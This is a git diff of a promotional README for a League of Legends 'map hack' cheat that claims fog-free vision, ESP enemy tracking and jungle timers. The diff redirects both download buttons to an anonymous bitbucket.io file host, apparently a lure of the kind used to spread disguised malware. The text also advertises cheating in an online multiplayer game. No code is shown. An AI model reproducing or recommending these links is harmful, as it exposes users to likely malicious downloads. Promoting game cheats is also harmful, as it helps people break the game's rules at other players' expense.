@@ -6,7 +6,7 @@ In **League of Legends**, information is everything. The difference between a wi
 
 That’s exactly what this **League of Legends Map Hack** delivers. A stealthy cheat overlay that gives you **fog-free vision**, **real-time ESP enemy tracking**, **ward alerts**, and **jungle timers** so accurate your own jungler will feel useless.
 
-[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🌍 Map Hack Features
@@ -43,7 +43,7 @@ Whether you're playing ranked, normals, or ARAM (for some reason), this map hack
 * Teamfight pings and respawn alerts
 * Buff steal awareness (shows who took what)
 
-[![Download MapHack](https://lh3.googleusercontent.com/-rtYYydLjIkA/XWQYxKTAE3I/AAAAAAAACM4/9T-7lJAajmUMqL6kC9MDwUFMxSMGYE6AwCLcBGAs/s1600/PhotoGrid_1566745552392.png)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download MapHack](https://lh3.googleusercontent.com/-rtYYydLjIkA/XWQYxKTAE3I/AAAAAAAACM4/9T-7lJAajmUMqL6kC9MDwUFMxSMGYE6AwCLcBGAs/s1600/PhotoGrid_1566745552392.png)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🆚 Why Use This Instead of Map Awareness Tools?
@@ -110,3 +110,4 @@ League of Legends map hack, LoL fog remover, ESP hack League, ward tracker LoL, 
 ---
 
 📡 They can’t hide if you always see. Take the map, take the win. 🎯🔥
+
